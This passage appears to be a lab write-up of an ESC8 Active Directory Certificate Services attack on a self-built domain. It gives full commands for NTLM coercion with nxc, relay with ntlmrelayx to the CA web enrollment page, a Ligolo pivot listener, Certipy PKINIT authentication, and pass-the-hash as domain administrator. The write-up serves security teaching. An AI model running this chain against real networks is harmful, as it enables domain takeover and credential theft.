Looking at nxc result we know which machine is the DC and which one is the Certificate Authority server . 

To save time , we won't do it blindly , since AD Enumeration can be pretty time consuming , but if you want more enumeration you can check this Checklist : 

```bash
https://elmehdilaassiri.github.io/posts/oscp-cpts-methodology/#active-directory-
```

First we will check the quick wins , let's see if the DC is vulnerable to any of the coercion attacks . 

But for this we first need valid creds , which we got from the NFS server , let's test them first : 

```bash
nxc smb DC01.Isolate.local -u svc_backup -p 'Backup@123'
```

<img width="1537" height="231" alt="image" src="https://github.com/user-attachments/assets/867755b7-4d06-464c-b93b-ca44c4fda04d" />

Perfect we got valid creds , we can test for coercion attacks , we can use the module Coerce plus from nxc which will test multiple vulnerabilities , like petitpotam , printspooler , DFSCoerce, etc : 

```bash
nxc smb DC01.Isolate.local -u svc_backup -p 'Backup@123' -M coerce_plus
```

<img width="1168" height="331" alt="image" src="https://github.com/user-attachments/assets/60a575ec-468e-461a-8c82-6640cc686f0a" />

Perfect , it is vulnerable . 

Now before we continue let me explain to you the attack that we're going to perform : 

**What is ESC8 ?**

ESC8 is one of the ADCS privilege escalation paths documented in SpecterOps' "Certified Pre-Owned" research. It abuses the Certificate Authority Web Enrollment interface (/certsrv/) which accepts NTLM authentication by default, without requiring Extended Protection for Authentication (EPA) making it vulnerable to NTLM relay attacks.

*The attack works in three stages:*

- Coercion : force a privileged machine (in our case, the Domain Controller) to authenticate outbound to an attacker-controlled listener using one of several well-known coercion techniques (PetitPotam, PrinterBug, DFSCoerce, etc.)
- Relay : intercept that NTLM authentication and relay it to the CA's Web Enrollment endpoint, requesting a certificate on behalf of the coerced machine account (DC01$) using the AD integrated DomainController certificate template
- Abuse : use the issued certificate to authenticate via Kerberos PKINIT, obtaining a TGT for DC01$, which has domain replication rights enabling a full DCSync and dumping every credential in the domain including krbtgt

The key prerequisite is that the CA and the coerced machine must be two separate boxes relaying a machine's auth back to a service running on that same machine triggers Windows' built-in NTLM reflection protection and fails silently, which is exactly why we set up a dedicated CA server instead of running ADCS directly on the DC.

Now first we confirmed that we can perform the coercion , now we just need to setup our Relay server , and make sure we're relaying back to the CA01 machine , for this we will use ntlmrelay from impacket : 

```bash
impacket-ntlmrelayx -t http://10.10.10.101/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
```

<img width="1418" height="737" alt="image" src="https://github.com/user-attachments/assets/f5c81702-11d2-4c2f-a7c5-a1ba8351fb42" />

Now we Trigger the coercion : force DC01 to authenticate back to Kali via PetitPotam:

Since everything is on the internal segment now and routed through Ligolo, the listener IP needs to be your Ligolo tun interface IP (10.10.10.10), which the DC can reach back through the pivot:

```bash
nxc smb 10.10.10.100 -u 'svc_backup' -p 'Backup@123' -M coerce_plus -o LISTENER=10.10.10.10 METHOD=PetitPotam
```

<img width="1564" height="671" alt="image" src="https://github.com/user-attachments/assets/d5f51785-5efd-45f7-97b8-cb9e78ed18d9" />

This didn't work since it will connect back to the Pivot box , but we haven't created any listener that will forward the traffic back to our Kali host . 

For this we need to go back to Ligolo and create a new listener that will forward all traffic coming to port 445 on the Pivot Box directly to our local port 445. 

```bash
ligolo-ng » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
```

<img width="1445" height="456" alt="image" src="https://github.com/user-attachments/assets/5a503198-0052-4f63-8ab7-2b784b3e8c49" />

So the new flow now is : 

```text
DC01 → authenticates to Fail2Copy:445 → Ligolo forwards → Kali:445 → ntlmrelayx catches and relays → CA01 Web Enrollment
```

Now if we try again :

<img width="1531" height="725" alt="image" src="https://github.com/user-attachments/assets/e8c09e94-e818-42d4-bfc7-99900e73fad2" />

It worked perfectly, and we got the PFX certificate for DC01$. We'll use this certificate to authenticate via Kerberos PKINIT and obtain a TGT using Certipy:

```bash
certipy auth -pfx ./DC01.pfx -dc-ip 10.10.10.100
```

Certipy handles the PKINIT exchange automatically , it authenticates the certificate against the DC, retrieves a TGT for DC01$, and also extracts the NT hash of the machine account directly, which we can use for pass-the-hash if needed.

<img width="1167" height="455" alt="image" src="https://github.com/user-attachments/assets/2cb21d84-d155-4ef3-ace4-b9f8d4e6208f" />

Now we have the Hash for the DC01$ which is a machine account , we won't use it to login , but instead we will dump all Hashes on the Domain , and from there login using the Domain Administrator Hash . 

<img width="1217" height="387" alt="image" src="https://github.com/user-attachments/assets/0e48d87d-43ae-4c05-b76c-77c80c9e4061" />

Now we can use it to authenticate , execute commands via nxc , etc . 

```bash
nxc smb 10.10.10.100 -u 'administrator' -H 43d4cf17b072d8b25ecb5fea0d04c62d -x whoami
```

<img width="1434" height="533" alt="image" src="https://github.com/user-attachments/assets/225de73e-4e4d-4abe-87df-47ae231e74ea" />

We now have Full domain Compromise through an ESC8 .











